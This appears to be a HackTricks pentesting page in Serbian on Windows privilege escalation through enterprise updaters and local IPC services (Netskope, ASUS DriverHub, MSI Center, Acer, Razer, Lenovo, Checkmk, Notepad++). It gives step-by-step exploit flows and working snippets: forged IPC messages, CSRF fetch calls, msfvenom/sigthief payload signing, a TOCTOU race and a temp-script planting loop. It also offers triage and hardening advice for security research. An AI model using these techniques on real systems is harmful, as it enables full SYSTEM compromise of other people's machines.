# Zloupotreba enterprise auto-updatera i privilegovanog IPC-a (npr. Netskope, ASUS i MSI)

{{#include ../../banners/hacktricks-training.md}}

Ova stranica uopštava klasu Windows lanaca za lokalno podizanje privilegija koji su pronađeni u enterprise endpoint agentima i updaterima koji izlažu lako dostupnu IPC površinu i privilegovani tok ažuriranja. Reprezentativan primer je Netskope Client for Windows < R129 (CVE-2025-0309), gde korisnik sa niskim privilegijama može da natera proces registracije da se poveže sa serverom pod kontrolom napadača, a zatim isporuči zlonamerni MSI koji SYSTEM servis instalira.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>

Ključne ideje koje možete primeniti na slične proizvode:
- Zloupotrebite localhost IPC privilegovanog servisa da biste naterali ponovnu registraciju ili rekonfiguraciju ka serveru napadača.
- Implementirajte vendorove update endpoint-e, isporučite lažni Trusted Root CA i usmerite updater ka zlonamernom, „potpisanom“ paketu.
- Zaobiđite slabe provere potpisnika (CN allow-list-e), opcione digest zastavice i nedovoljno restriktivna MSI svojstva.
- Ako je IPC „šifrovan“, izvedite ključ/IV iz identifikatora mašine dostupnih svima, koji su sačuvani u registry-ju.
- Ako servis ograničava pozivaoce prema putanji izvršne datoteke/nazivu procesa, ubacite kod u proces sa allow-list-e ili pokrenite takav proces suspendovan i učitajte DLL pomoću minimalne izmene konteksta niti.

Prilagođene lokalne TCP usluge zahtevaju istu proveru identiteta i granica ulaznih podataka, čak i kada zahtevaju PIN ili druge akreditивe aplikacije. Utvrdite koji proces i koji efektivni nalog servisa koriste listener, a zatim proverite tačnu raspoređenu binarnu datoteku/verziju i da li se polja pod kontrolom pozivaoca proveravaju po dužini pre kopiranja u fiksne bafere ili upotrebe za sastavljanje komande za podređeni proces. [Microsoft's buffer-overrun guidance](https://learn.microsoft.com/en-us/windows/win32/secbp/avoiding-buffer-overruns) objašnjava zašto su neprovereni eksterni ulazni podaci opasni u privilegovanom native kodu. Loopback listener, hardkodovani akreditiv ili sam naziv procesa ne dokazuju postojanje korupcije memorije ili izvršavanje kao SYSTEM; dostupnost, autorizacija, putanja koda i mitigacije zasebni su uslovi. Rutinsko enumerisanje treba da ostane pasivno, umesto da se servisu uživo šalju ulazni podaci dužine koja izaziva pad.

---
## 1) Usmeravanje registracije ka serveru napadača putem localhost IPC-a

Mnogi agenti uključuju UI proces u korisničkom režimu koji komunicira sa SYSTEM servisom preko localhost TCP-a koristeći JSON.

Zapaženo u Netskope-u:
- UI: stAgentUI (nizak integritet) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Tok exploita:
1) Napravite JWT token za registraciju čiji claim-ovi određuju backend host (npr. AddonUrl). Koristite alg=None da potpis ne bi bio potreban.
2) Pošaljite IPC poruku koja poziva provisioning komandu, zajedno sa JWT-jem i nazivom tenant-a:

```json
{
  "148": {
    "idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
    "tenantName": "TestOrg"
  }
}
```

3) Servis počinje da šalje zahteve vašem lažnom serveru za registraciju/konfiguraciju, npr.:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Napomene:
- Ako se identitet pozivaoca proverava na osnovu putanje/naziva, pošaljite zahtev iz binarne datoteke dobavljača koja je na listi dozvoljenih (pogledajte §4).<sup>[[1]](#references)[[2]](#references)</sup>

---
## 2) Otimanje kanala za ažuriranje radi pokretanja koda kao SYSTEM

Kada klijent počne da komunicira s vašim serverom, implementirajte očekivane endpoint-e i usmerite ga ka zlonamernom MSI-ju. Tipičan sled:

1) /v2/config/org/clientconfig → Vratite JSON konfiguraciju sa veoma kratkim intervalom ažuriranja, npr.:
```json
{
  "clientUpdate": { "updateIntervalInMin": 1 },
  "check_msi_digest": false
}
```
2) /config/ca/cert → Vraća PEM CA sertifikat. Servis ga instalira u Local Machine Trusted Root store.
3) /v2/checkupdate → Prosleđuje metapodatke koji upućuju na zlonamerni MSI i lažnu verziju.

Zaobilaženje čestih provera koje se viđaju u praksi:
- Allow-list za signer CN: servis može samo da proverava da li je Subject CN jednak „netSkope Inc” ili „Netskope, Inc.”. Vaš rogue CA može da izda leaf sertifikat sa tim CN-om i potpiše MSI.
- Svojstvo CERT_DIGEST: uključite bezazleno MSI svojstvo pod nazivom CERT_DIGEST. Prilikom instalacije se ne proverava.
- Opciona provera digest vrednosti: konfiguraciona zastavica (npr. check_msi_digest=false) isključuje dodatnu kriptografsku validaciju.

Rezultat: SYSTEM servis instalira vaš MSI iz
C:\ProgramData\Netskope\stAgent\data\*.msi
i izvršava proizvoljan kod kao NT AUTHORITY\SYSTEM.<sup>[[1]](#references)[[2]](#references)</sup>

Pouka o zaobilaženju zakrpa: ako dobavljač reaguje tako što napravi allow-listu malog broja „pouzdanih” domena umesto da kriptografski proverava autentičnost izvora ažuriranja, potražite redirectore ili reverse proxy-je u vlasništvu dobavljača koji vam i dalje omogućavaju da usmeravate saobraćaj. U slučaju Netskope-a, naknadno objavljeno istraživanje pokazalo je da se allow-lista iz doba R129 i dalje mogla zloupotrebiti preko `rproxy.goskope.com`, koji je prosleđivao sadržaj sa Azure App Service-a pod kontrolom napadača. Allow-liste hostova smatrajte preprekom koja samo usporava napad, a ne granicom poverenja.<sup>[[14]](#references)</sup>

---
## 3) Falsifikovanje šifrovanih IPC zahteva (kada postoje)

Od R127, Netskope je IPC JSON umotavao u polje encryptData koje izgleda kao Base64. Reverzni inženjering je pokazao da se koristi AES, sa ključem/IV-om izvedenim iz vrednosti u registru koje može da čita svaki korisnik:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Napadači mogu da reprodukuju šifrovanje i šalju ispravne šifrovane komande sa standardnog korisničkog naloga.<sup>[[1]](#references)[[2]](#references)</sup> Opšti savet: ako agent iznenada počne da „šifruje” svoj IPC, potražite ID-jeve uređaja, GUID-ove proizvoda i ID-jeve instalacije u HKLM-u, koje koristi kao materijal.

---
## 4) Zaobilaženje allow-lista IPC pozivalaca (provere putanje/naziva)

Neki servisi pokušavaju da autentifikuju peer tako što utvrđuju PID TCP veze i upoređuju putanju/naziv slike sa allow-listom binarnih fajlova dobavljača koji se nalaze u Program Files (npr. stagentui.exe, bwansvc.exe, epdlp.exe).

Dva praktična načina zaobilaženja:
- DLL injection u allow-listovan proces (npr. nsdiag.exe) i prosleđivanje IPC zahteva iz njega.
- Pokrenite allow-listovani binarni fajl u suspendovanom stanju i pokrenite svoju proxy DLL biblioteku bez CreateRemoteThread (pogledajte §5) da biste zadovoljili pravila zaštite od neovlašćenih izmena koju sprovodi drajver.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 5) Injection kompatibilan sa zaštitom od neovlašćenih izmena: suspendovan proces + NtContinue zakrpa

Proizvodi često uključuju minifilter/OB callbacks drajver (npr. Stadrv) koji uklanja opasna prava sa handle-ova ka zaštićenim procesima:
- Process: uklanja PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: ograničava prava na THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Pouzdan user-mode loader koji poštuje ova ograničenja:
1) Kreirajte proces vendor binarnog fajla pomoću CREATE_SUSPENDED.
2) Dobavite handle-ove koje vam je i dalje dozvoljeno da koristite: PROCESS_VM_WRITE | PROCESS_VM_OPERATION za proces i handle niti sa THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (ili samo THREAD_RESUME ako zakrpite kod na poznatom RIP-u).
3) Prepišite ntdll!NtContinue (ili neki drugi rano učitani thunk za koji je garantovano da je mapiran) malim stubom koji poziva LoadLibraryW sa putanjom vaše DLL biblioteke, a zatim skače nazad.
4) Pozovite ResumeThread da biste pokrenuli stub unutar procesa i učitali svoju DLL biblioteku.

Pošto niste koristili PROCESS_CREATE_THREAD niti PROCESS_SUSPEND_RESUME na već zaštićenom procesu (vi ste ga kreirali), poštujete pravila drajvera.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 6) Praktični alati
- NachoVPN (Netskope plugin) automatizuje rogue CA, potpisivanje zlonamernog MSI-ja i posluživanje potrebnih endpointa: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.<sup>[[3]](#references)</sup>
- UpSkope je prilagođeni IPC klijent koji sastavlja proizvoljne IPC poruke (po želji AES-šifrovane) i uključuje injection suspendovanog procesa da bi poruke potekle od allow-listovanog binarnog fajla.<sup>[[4]](#references)</sup>

## 7) Brzi postupak trijaže za nepoznate površine updater-a/IPC-ja

Kada naiđete na novog endpoint agenta ili paket „pomoćnih” alata za matičnu ploču, obično je dovoljan brz postupak da utvrdite da li ste pronašli obećavajuću metu za privesc:<sup>[[6]](#references)</sup>

1) Nabrojte loopback listenere i povežite ih sa procesima dobavljača:

```powershell
Get-NetTCPConnection -State Listen |
  Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
  Select-Object LocalAddress,LocalPort,OwningProcess,
    @{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```

2) Izlistajte potencijalne imenovane cevi:

```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```

3) Prikupite podatke o rutiranju smeštene u registru koje koriste IPC serveri zasnovani na dodacima:

```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
  Select-Object PSChildName
```

4) Najpre izdvojite nazive endpointa, JSON ključeve i ID-jeve komandi iz klijenta u korisničkom režimu. Upakovani Electron/.NET frontendovi često leak-uju celu šemu:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
  -Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```

5) Potražite stvarni predikat poverenja, a ne samo putanju koda koja na kraju pokreće proces:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
  -Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```

Obrasci kojima vredi dati prioritet:
- `CryptQueryObject`/parsiranje sertifikata bez `WinVerifyTrust` obično znači da je „sertifikat postoji” tretirano kao „sertifikat je pouzdan”, što omogućava kloniranje sertifikata ili druge trikove s lažnim potpisnikom.
- Provere podniske/sufiksa nad `Origin`, `Referer`, URL-ovima za preuzimanje, imenima procesa ili CN-ovima potpisnika nisu autentifikacija. `contains(".vendor.com")` je obično moguće iskoristiti pomoću domena sličnog originalu koji kontroliše napadač.
- Ako GUI s niskim privilegijama odlučuje „fajl je pouzdan”, a SYSTEM broker samo koristi taj rezultat, zakrpljivanje ili ponovna implementacija DLL-a/JS-a na strani klijenta često u potpunosti zaobilazi granicu (podeljena validacija u stilu Razera).
- Ako broker kopira payload u `%TEMP%`/`C:\Windows\Temp`, a zatim ga validira ili zakazuje sa te putanje, odmah testirajte TOCTOU vremenske prozore za zamenu i susedne module dodataka koji izlažu alternativne omotače `ExecuteTask()` sa slabijim proverama.<sup>[[6]](#references)</sup>

Za ciljeve koji intenzivno koriste imenovane cevi, PipeViewer je brz način da uočite slabe DACL-ove i cevi dostupne na daljinu pre nego što počnete detaljno da reverzujete protokol.<sup>[[11]](#references)</sup>

Ako cilj autentifikuje pozivaoce samo na osnovu PID-a, putanje izvršne datoteke ili imena procesa, tretirajte to kao prepreku koju je lako preći, a ne kao granicu: ubacivanje koda u legitimni klijent ili uspostavljanje veze iz procesa sa dozvoljene liste često je dovoljno da zadovolji provere servera. Konkretno za imenovane cevi, [ova stranica o lažnom predstavljanju klijenta i zloupotrebi cevi](named-pipe-client-impersonation.md) detaljnije obrađuje tu tehniku.

Kod privilegovanog **cleanup ili restore brokera**, proverite i granicu poverenja putanje, kao i ACL cevi. Pozivalac s nižim privilegijama možda može da izabere odredište za vraćanje ili preimenuje privremeno sačuvan artefakt rezervne kopije u deljenom direktorijumu, čak i kada su izvršna datoteka servisa i njen instalacioni direktorijum zaštićeni. Zasebno potvrdite da pozivalac može da dođe do komande za vraćanje, izmeni tačno određeni privremeno sačuvani ulazni fajl ili ime fajla, da se broker izvršava pod identitetom s višim privilegijama i da njegova operacija vraćanja zaista upisuje podatke na izabranu zaštićenu putanju. Direktorijum za privremeno čuvanje u koji može da se upisuje ili cev koja može da se čita sami po sebi ne dokazuju mogućnost proizvoljnog privilegovanog upisa; mapiranje odredišta i ponašanje servisa treba pregledati u kodu ili proveriti kontrolisanim testiranjem. Nemojte pokretati nepoznatu cleanup komandu tokom pasivnog izviđanja jer može da obriše korisničke fajlove.

---
## 8) Modularni brokeri dodataka koji autentifikuju samo na osnovu potpisa dobavljača (obrazac Lenovo Vantage)

Novija varijanta koju vredi potražiti jeste **RPC broker sa potpisanim klijentom**: Lenovo desktop proces s niskim privilegijama razgovara sa SYSTEM servisom, a servis prosleđuje JSON komande skupu dodataka opisanih u XML-u, smeštenih u `%ProgramData%`. Kada se postigne izvršavanje koda **unutar bilo kog prihvaćenog potpisanog klijenta**, svaki ugovor sa `runas="system"` postaje deo vaše površine napada.<sup>[[15]](#references)</sup>

Primitivi visoke vrednosti uočeni u istraživanju Lenovo Vantage:
- **Poverenje u pozivaoca zato što ga je potpisao dobavljač**: istraživači su došli do autentifikovanog konteksta tako što su kopirali Lenovo-potpisan EXE u direktorijum u koji može da se upisuje i zadovoljili uslov za DLL side-load (`profapi.dll`), čime se proizvoljan kod izvršio unutar klijenta kome je servis već verovao.
- **Otkrivanje površine napada vođeno manifestom**: dodaci su deklarisani u `C:\ProgramData\Lenovo\Vantage\Addins\*.xml`; nekoliko ugovora izvršava se kao `SYSTEM`, pa pregled tih manifesta često brže otkriva stvarne privilegovane komande nego reverzovanje samog brokera.
- **Greške po pojedinačnim komandama iza autentifikovanog kanala**: kada su ušli u pouzdanog klijenta, javno istraživanje je otkrilo ranjivosti path traversal + race condition u komandama za ažuriranje/instalaciju, zloupotrebu sirovog SQL-a u privilegovanim bazama postavki i provere putanje registratora zasnovane na podniski koje su omogućavale upise van predviđene grane registra.

Korisno izviđanje na cilju:

```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
  Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
  -Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```

Praktičan zaključak: kad god pomoćni paket izlaže broker koji prvo autentifikuje **proces pozivaoca**, a tek onda prosleđuje zahteve desetinama komandi dodataka/pluginova, nemojte stati nakon zaobilaženja provere poverenja na ulazu. Izdvojite tabelu manifesta/ugovora i zasebno fuzz-ujte svaku komandu sa visokim privilegijama; autentifikovani kanal obično skriva nekoliko ranjivosti u drugoj fazi.

---
## 1) CSRF iz browsera ka localhost-u protiv privilegovanih HTTP API-ja (ASUS DriverHub)

DriverHub isporučuje HTTP servis u korisničkom režimu (ADU.exe) na adresi 127.0.0.1:53000 koji očekuje browser pozive sa https://driverhub.asus.com. Filter porekla jednostavno primenjuje `string_contains(".asus.com")` na Origin zaglavlje i URL-ove za preuzimanje koje izlaže `/asus/v1.0/*`. Zato svaki host pod kontrolom napadača, kao što je `https://driverhub.asus.com.attacker.tld`, prolazi proveru i može da šalje zahteve koji menjaju stanje iz JavaScript-a.<sup>[[6]](#references)</sup> Pogledajte [osnove CSRF-a](../../pentesting-web/csrf-cross-site-request-forgery.md) za dodatne obrasce zaobilaženja.

Praktičan tok:
1) Registrujte domen koji sadrži `.asus.com` i postavite na njemu zlonamernu veb-stranicu.
2) Koristite `fetch` ili XHR da pozovete privilegovanu krajnju tačku (npr. `Reboot`, `UpdateApp`) na `http://127.0.0.1:53000`.
3) Pošaljite JSON telo koje handler očekuje – upakovani frontend JS prikazuje šemu ispod.

```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```

Čak i PowerShell CLI prikazan ispod uspešno radi kada se zaglavlje Origin lažira tako da sadrži pouzdanu vrednost:

```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
  -Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
  -Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```

Svaka poseta sajtu napadača zato postaje CSRF na lokalnom računaru koji jednim klikom (ili bez klika, putem `onload`) pokreće SYSTEM helper.

---
## 2) Neispravna provera code-signing potpisa i kloniranje sertifikata (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` preuzima proizvoljne izvršne datoteke navedene u JSON telu zahteva i kešira ih u `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. Provera URL-a za preuzimanje koristi istu logiku zasnovanu na podniskama, pa se prihvata `http://updates.asus.com.attacker.tld:8000/payload.exe`. Nakon preuzimanja, ADU.exe samo proverava da PE sadrži potpis i da se Subject string poklapa sa ASUS-om pre nego što pokrene datoteku – nema `WinVerifyTrust` ni provere lanca sertifikata.

Da biste iskoristili ovaj tok:
1) Napravite payload (npr. `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Klonirajte potpisnika kompanije ASUS u njega (npr. `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Hostujte `pwn.exe` na domену-имитацији `.asus.com` и покрените UpdateApp помоћу претходног browser CSRF-а.

Пошто су и филтери за Origin и URL засновани на поднискама, а провера потписника само пореди стрингове, DriverHub преузима и покреће бинарну датотеку нападача у свом привилегованом контексту.<sup>[[6]](#references)</sup>

---
## 1) TOCTOU у путањама за копирање/покретање ажурирача (MSI Center CMD_AutoUpdateSDK)

SYSTEM сервис програма MSI Center излаже TCP протокол у ком је сваки оквир формата `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. Основна компонента (Component ID `0f 27 00 00`) испоручује `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Његов handler:
1) Копира задату извршну датотеку у `C:\Windows\Temp\MSI Center SDK.exe`.
2) Проверава потпис путем `CS_CommonAPI.EX_CA::Verify` (Subject сертификата мора бити једнак „MICRO-STAR INTERNATIONAL CO., LTD.“, а `WinVerifyTrust` мора да успе).
3) Прави заказани задатак који покреће привремену датотеку као SYSTEM, са аргументима које контролише нападач.

Копирана датотека није закључана између провере и позива `ExecuteTask()`. Нападач може да:
- Пошаље оквир A који указује на легитимну бинарну датотеку потписану од стране MSI-ја (чиме се гарантује пролазак провере потписа и заказивање задатка).
- Истовремено шаље поновљене поруке оквира B које указују на злонамерни payload и преписују `MSI Center SDK.exe` одмах након завршетка провере.

Када се заказани задатак покрене, он извршава преписани payload као SYSTEM, иако је проверио оригиналну датотеку. Поуздано искоришћавање захтева две goroutine нити које непрекидно шаљу CMD_AutoUpdateSDK све док не освоје TOCTOU прозор.<sup>[[6]](#references)</sup>

---
## 2) Злоупотреба прилагођеног IPC-а на нивоу SYSTEM-а и impersonation-а (MSI Center + Acer Control Centre)

### Скупови TCP команди у MSI Center-у
- Сваки plugin/DLL који учитава `MSI.CentralServer.exe` добија Component ID сачуван у `HKLM\SOFTWARE\MSI\MSI_CentralServer`. Прва 4 бајта оквира бирају ту компоненту, што нападачима омогућава да усмере команде произвољним модулима.
- Plugin-и могу да дефинишу сопствене task runner-е. `Support\API_Support.dll` излаже `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` и директно позива `API_Support.EX_Task::ExecuteTask()` **без провере потписа** – сваки локални корисник може да га усмери на `C:\Users\<user>\Desktop\payload.exe` и поуздано добије извршавање као SYSTEM.
- Сниффовање loopback са Wireshark-ом или инструментација .NET бинарних датотека у dnSpy-ју брзо открива мапирање компоненти и команди; затим прилагођени Go/Python клијенти могу да репродукују оквире.<sup>[[6]](#references)</sup>

### Именовани pipe-ови и нивои impersonation-а у Acer Control Centre-у
- `ACCSvc.exe` (SYSTEM) излаже `\\.\pipe\treadstone_service_LightMode`, а његова дискрециона ACL листа дозвољава удаљене клијенте (нпр. `\\TARGET\pipe\treadstone_service_LightMode`). Слањем ID-а команде `7` са путањом до датотеке позива се рутина сервиса за покретање процеса.
- Клијентска библиотека серијализује магични завршни бајт (113) заједно са аргументима. Динамичка инструментација помоћу Frida/`TsDotNetLib` (погледајте [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) за савете о инструментацији) показује да нативни handler мапира ову вредност у `SECURITY_IMPERSONATION_LEVEL` и SID интегритета пре позива `CreateProcessAsUser`.
- Замена вредности 113 (`0x71`) са 114 (`0x72`) води у генеричку грану која задржава цео SYSTEM токен и поставља SID високог интегритета (`S-1-16-12288`). Зато се покренута бинарна датотека извршава као неограничени SYSTEM, локално и на удаљеној машини.
- Комбинујте то са изложеном заставицом инсталатора (`Setup.exe -nocheck`) да бисте инсталирали ACC чак и на лабораторијске виртуелне машине и тестирали pipe без хардвера произвођача.<sup>[[6]](#references)</sup>

Ове IPC рањивости показују зашто localhost сервиси морају да спроводе узајамну аутентификацију (ALPC SID-ови, филтери `ImpersonationLevel=Impersonation`, филтрирање токена) и зашто сваки модулски helper за „покретање произвољне бинарне датотеке“ мора да користи исте провере потписа.

---
## 3) COM/IPC „elevator“ helper-и засновани на слабој валидацији у user-mode-у (Razer Synapse 4)

Razer Synapse 4 је додао још један користан образац у ову групу: корисник са ниским привилегијама може да затражи од COM helper-а да покрене процес путем `RzUtility.Elevator`, док се одлука о поверењу препушта user-mode DLL-у (`simple_service.dll`) уместо да се поуздано спроводи унутар привилеговане границе.

Уочени ток искоришћавања:
- Инстанцирајте COM објекат `RzUtility.Elevator`.
- Позовите `LaunchProcessNoWait(<path>, "", 1)` да бисте затражили покретање са повишеним привилегијама.
- У јавном PoC-у, провера PE потписа унутар `simple_service.dll` се закрпи и уклања пре слања захтева, што омогућава покретање произвољне извршне датотеке коју одабере нападач.<sup>[[6]](#references)[[10]](#references)</sup>

Минимални PowerShell позив:

```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```

Opšti zaključak: pri analiziranju „helper“ paketa, nemojte se zaustaviti na TCP-u za localhost ili imenovanim kanalima. Proverite da li postoje COM klase sa nazivima kao što su `Elevator`, `Launcher`, `Updater` ili `Utility`, a zatim utvrdite da li privilegovani servis zaista sam proverava ciljnu binarnu datoteku ili samo veruje rezultatu koji je izračunala DLL biblioteka klijenta u korisničkom režimu, koju je moguće zakrpiti. Ovaj obrazac se ne odnosi samo na Razer: svako rešenje podeljeno tako da posrednik sa visokim privilegijama preuzima odluku allow/deny sa strane sa niskim privilegijama predstavlja moguću površinu za privesc.


---
## Predvidljivo izvršavanje privremene skripte tokom MSI popravke (Checkmk Agent / CVE-2024-0670)

Neki Windows agenti i dalje izvršavaju privilegovane radnje tako što upisuju privremenu `.cmd` datoteku u `C:\Windows\Temp`, a zatim je pokreću kao `SYSTEM`. Ako je naziv datoteke predvidljiv, a servis ne kreira bezbedno datoteku ako ona već postoji, korisnik sa niskim privilegijama može unapred da napravi buduću privremenu datoteku kao **read-only** i navede privilegovani proces da izvrši sadržaj pod kontrolom napadača umesto sopstvene skripte.

Uočeno u ranjivim izdanjima Checkmk Agent-a:
- obrazac privremenih datoteka: `cmk_all_<PID>_1.cmd`
- pogođene grane: `2.0.0`, `2.1.0`, `2.2.0`
- okidač: **repair** keširanog paketa agenta u MSI-ju<sup>[[8]](#references)[[9]](#references)</sup>

Praktični postupak:
1. Procenite realističan raspon PID-ova na osnovu trenutnih ID-jeva procesa ili PID-a pokrenutog agenta.
2. Zapišite kratak `.cmd` sadržaj u **ASCII** formatu (`Set-Content -Encoding Ascii` ili preusmeravanjem iz `cmd.exe`; izbegavajte PowerShell izlaz u UTF-16 za batch datoteke).
3. Napravite datoteke `C:\Windows\Temp\cmk_all_<PID>_1.cmd` za kandidate u tom rasponu i označite svaku kao read-only.
4. Pokrenite repair keširanog MSI-ja, tako da privilegovani servis pokuša da ponovo napravi, a zatim izvrši privremenu skriptu.<sup>[[7]](#references)</sup>

```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
  Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
  Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```

Ako je ranjivi proizvod instaliran pomoću Windows Installer-a, utvrdite naziv proizvoda povezan sa nasumično izgledajućim keširanim MSI paketom u `C:\Windows\Installer` pre nego što pokrenete popravku:<sup>[[7]](#references)</sup>

```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
  ForEach-Object {
    $p = Get-ItemProperty $_.PSPath
    [PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
  } | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```

Operativne napomene:
- `qwinsta` je koristan kada `msiexec /fa` ne uspe iz neinteraktivne WinRM ljuske, a potrebno je utvrditi da li postojeća desktop sesija ili prekinuta sesija može pravilno da pokrene popravku.<sup>[[7]](#references)</sup>
- Ovaj obrazac se može primeniti i na druge endpoint agente i ažurirače koji **postavljaju privremene skripte na lokacije sa dozvolama za upis za sve korisnike, a zatim ih izvršavaju kao SYSTEM**. Proverite predvidljive nazive, nedostatak ekskluzivne semantike kreiranja i tokove popravke/ažuriranja koji mogu da se pokrenu na zahtev.

### Popravka interaktivnog instalera i privilegovana konzola

PDF24 Creator 11.15.1 pokazuje zaseban rizik pri popravci MSI-ja: njegova prilagođena akcija za instalaciju štampača može tokom popravke da pokrene vidljivu konzolu sa SYSTEM pravima. Dobavljač je izmenio MSI instalacioni program u verziji 11.15.2 da bi rešio ovo ponašanje. Starija verzija proizvoda samo je trag za trijažu. Proverite registrovani ili dostupni MSI paket, da li ovaj korisnik može da pokrene popravku, da li su prisutni ranjiva prilagođena akcija i kašnjenje log datoteke, kao i da li interaktivna radna površina može da prikaže konzolu. Prijavljeno kašnjenje koristilo je oplock na `faxPrnInst.log`; obična mogućnost upisa u datoteku nije jedini uslov za pristup. Neinteraktivna ljuska, nedostupan paket ili zakrpljeni instalacioni program mogu da prekinu lanac. Ovaj problem ne zavisi od `AlwaysInstallElevated` i razlikuje se od zamene predvidljive privremene skripte.

---
## Daljinsko preuzimanje kontrole nad lancem snabdevanja zbog slabe validacije ažurirača (WinGUp / Notepad++)

Između juna 2025. i decembra 2025, napadači koji su kompromitovali infrastrukturu za hosting iza toka ažuriranja Notepad++-a selektivno su isporučivali zlonamerne manifeste odabranim žrtvama. Stariji ažurirači zasnovani na WinGUp-u nisu u potpunosti proveravali autentičnost ažuriranja, pa je zlonameran XML odgovor mogao da preusmeri klijente na URL-ove pod kontrolom napadača. Pošto je klijent prihvatao HTTPS sadržaj bez provere pouzdanog lanca sertifikata i važećeg PE potpisa preuzetog instalacionog programa, žrtve su preuzimale i izvršavale trojanizovani NSIS `update.exe`.<sup>[[12]](#references)[[13]](#references)</sup>

Operativni tok (lokalni exploit nije potreban):
1. **Presretanje infrastrukture**: kompromitovati CDN/hosting i odgovoriti na provere ažuriranja metapodacima napadača koji upućuju na zlonamerni URL za preuzimanje.
2. **Trojanizovani NSIS**: instalacioni program preuzima/izvršava payload i zloupotrebljava dva lanca izvršavanja:
   - **Korišćenje sopstvenog potpisanog binarnog fajla uz sideload**: uključiti potpisani Bitdefender `BluetoothService.exe` i postaviti zlonamerni `log.dll` na putanju pretrage. Kada se potpisani binarni fajl pokrene, Windows učitava `log.dll` putem sideload-a, a ona dešifruje i refleksivno učitava Chrysalis backdoor (zaštićen pomoću Warbird-a + API hashing otežava statičku detekciju).
   - **Skriptovana shellcode injekcija**: NSIS izvršava kompajliranu Lua skriptu koja koristi Win32 API-je (npr. `EnumWindowStationsW`) za ubacivanje shellcode-a i pripremu Cobalt Strike Beacon-a.<sup>[[12]](#references)</sup>

Preporuke za ojačavanje/otkrivanje za svaki auto-updater:
- Zahtevajte **proveru sertifikata i potpisa** preuzetog instalacionog programa (fiksirajte potpisnika dobavljača, odbijte nepodudaranje CN-a/lanca) i potpišite sam manifest ažuriranja (npr. XMLDSig). Blokirajte preusmeravanja koja određuje manifest, osim ako nisu validirana.
- Tretirajte **sideload-ovanje potpisanog binarnog fajla koji napadač sam obezbeđuje** kao tačku za detekciju nakon preuzimanja: generišite upozorenje kada potpisani EXE dobavljača učita DLL sa putanje izvan kanonske instalacione putanje (npr. Bitdefender učita `log.dll` iz Temp/Downloads) i kada ažurirač postavi/izvrši instalacione programe iz privremene lokacije koji nemaju potpis dobavljača.
- Pratite **artefakte specifične za malver** uočene u ovom lancu (korisni kao opšte tačke za istragu): mutex `Global\Jdhfv_1.0.1`, neuobičajene upise `gup.exe` u `%TEMP%` i faze shellcode injekcije pokrenute iz Lua-e.
